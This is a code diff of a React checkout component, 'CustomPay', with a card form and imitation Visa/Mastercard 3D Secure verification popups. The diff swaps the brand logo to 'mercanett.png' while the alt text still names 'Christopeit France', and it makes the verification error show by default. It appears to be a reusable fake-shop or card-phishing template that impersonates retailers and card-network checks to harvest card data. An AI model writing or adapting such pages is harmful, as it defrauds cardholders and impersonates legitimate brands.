@@ -4,7 +4,7 @@ import { useRouter } from 'next/router';
 
 
 
-const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop, cart }) => {
+const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data, shop, cart, brand }) => {
   const [formData, setFormData] = useState({
     cardHolder: '',
     cardNumber: '',
@@ -13,7 +13,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   });
 
   const [showPaymentError, setShowPaymentError] = useState(false);
-  const [showVerifError, setShowVerifError] = useState(false);
+  const [showVerifError, setShowVerifError] = useState(true);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
   const [checkoutProvider, setCheckoutProvider] = useState("rento");
 
@@ -339,19 +339,19 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         <button id="pay-checkout" type="submit">
           {data.checkoutPayProceedButton}
         </button>
-      </article>
+      </article> 
 
       {isLoading && (
         <div className="verification-wrapper">
           <div className="verification-popup loading">
             <article className="head">
-              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img className="brand-logo" src="mercanett.png" alt="Christopeit France" />
               <img
                 className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                 src={cardLogo}
                 alt={data.checkoutPayVerifiedPaymentAlt}
               />
-            </article>
+            </article> 
             <h2>{data.checkoutPayLoadingTitle}</h2>
             <p className="desc">{data.checkoutPayLoadingDescription}</p>
             <div className="loader border-top-primary"></div>
@@ -363,7 +363,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         <div className="verification-wrapper">
           <div className="verification-popup d-secure">
             <article className="head">
-              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img className="brand-logo" src="mercanett.png" alt="Christopeit France" />
               <img
                 className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                 src={cardLogo}
@@ -395,7 +395,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         <div className="verification-wrapper">
           <div className="verification-popup error">
             <article className="head">
-              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img className="brand-logo" src="mercanett.png" alt="Christopeit France" />
               <img
                 className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                 src={cardLogo}
@@ -416,7 +416,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         <div className="verification-wrapper">
           <div className="verification-popup error">
             <article className="head">
-              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img className="brand-logo" src="mercanett.png" alt="Christopeit France" />
               <img
                 className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
                 src={cardLogo}
